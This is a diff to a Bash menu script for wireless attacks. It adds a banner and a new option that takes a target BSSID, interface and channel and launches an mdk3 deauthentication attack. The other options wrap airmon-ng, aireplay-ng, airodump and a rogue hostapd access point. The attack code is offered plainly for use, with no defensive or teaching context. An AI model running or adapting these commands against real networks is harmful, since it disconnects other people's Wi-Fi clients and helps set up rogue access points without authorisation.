@@ -2,6 +2,17 @@
 #echo I ❤ Adam_ALwan | lolcat -a -d 500
 #figlet I ❤ Adam_ALwan | lolcat
 clear
+echo -e "\033[1;37m---------------------------------------------------\033[0m"
+echo -ne "\033[1;33m"
+echo -e "\033[0m"
+echo -e "\033[1;37m---------------------------------------------------\033[0m"
+echo -e "\033[1;37m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m"
+echo -e "\033[1;37m░░░░░                                         ░░░░░\033[0m"
+echo -e "\033[1;37m░░░░░ \033[1;31mhttps://github.com/Adam713/\033[1;37m ░░░░░\033[0m"
+echo -e "\033[1;37m░░░░░ \033[1;31m                  1.1                  \033[1;37m ░░░░░\033[0m"
+echo -e "\033[1;37m░░░░░                                         ░░░░░\033[0m"
+echo -e "\033[1;37m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\033[0m"
+echo -e "\033[1;37m---------------------------------------------------\033[0m"
 printf '\033]2;INSTALLER\a'
 echo -e "Press \e[1;33m any key\e[0m to install the script..."
 read -n 1
@@ -14,10 +25,11 @@ figlet I ❤ Adam_ALwan | lolcat
 printf '\033]2;INSTALLER\a'
 echo -e "1)\e[1;33m airmon-ng\e[0m "
 echo -e "2)\e[1;33m START Monitor mode\e[0m "
-echo -e "3) aireplay-ng network "
+echo -e "3)\033[1;37m aireplay-ng network \033[0m"
 echo -e "4) aireplay-ng mac Target "
 echo -e "5)airodump "
 echo -e "6)Run Hostapd "
+echo -e "7)mdk ataack"
 
 
 #echo -e "4)Run dnsmasq "
@@ -75,11 +87,19 @@ echo -e "Whait...!"
 sleep 6
 sudo xterm -e hostapd /home/kali/Desktop/bash/test-bash/Adam-Tools/hostapd.conf
 
-#read -p "please Enter Yor Option > " tryag
+read -p "please Enter Yor Option > " tryag
 elif [[ $tryag -eq '7' ]]; then
 echo -e "Whait...!"
+rm -rf mac-list.txt
+touch mac-list.txt
+read -p "Enter bssid :# " text
+echo $text >> mac-list.txt
+read -p "Enter Intrface :# " i
+read -p "Enter number channel :# " c
+sudo xterm -e mdk3 $i d -b mac-list.txt -c $c
+
 sleep 1
-clear
+#clear
 
 read -p "please Enter Yor Option > " tryag 
 elif [[ $tryag -eq '0' ]]; then
